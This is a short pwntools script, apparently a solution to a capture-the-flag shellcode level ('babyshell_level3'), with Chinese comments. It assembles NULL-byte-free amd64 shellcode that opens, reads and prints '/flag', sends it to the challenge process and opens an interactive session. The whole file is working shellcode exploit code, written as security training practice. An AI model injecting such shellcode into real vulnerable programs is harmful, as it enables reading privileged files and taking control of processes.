from pwn import *

context(arch='amd64', os='linux')

context(arch = 'amd64' , os = 'linux')
p = process("/challenge/babyshell_level3")
'''
shellcode=shellcraft.cat("/flag")
shellcode=asm(shellcode)
print(shellcode)
print(disasm(shellcode))
print("Does shellcode contain NULL bytes?", b'\x00' in shellcode)

p.send(shellcode)

p.interactive()
'''
# 使用 pushstr 压入 "/flag" 字符串而不包含 NULL 字节
shellcode = shellcraft.pushstr('/flag')
# 打开文件
shellcode += shellcraft.open('rsp', 0, 0)  # 'rsp' 指向刚推送的字符串
# 读取文件内容
shellcode += shellcraft.read('rax', 'rsp', 1024)  # 假设我们读取最多1024字节
# 将文件内容写到标准输出
shellcode += shellcraft.write(1, 'rsp', 'rax')
# 退出
shellcode += shellcraft.exit(0)

# 编译 shellcode
binary_code = asm(shellcode)

# 打印生成的 shellcode 以检查是否包含 NULL 字节
print(disasm(binary_code))
print("Does shellcode contain NULL bytes?", b'\x00' in binary_code)


p.send(binary_code)

p.interactive()
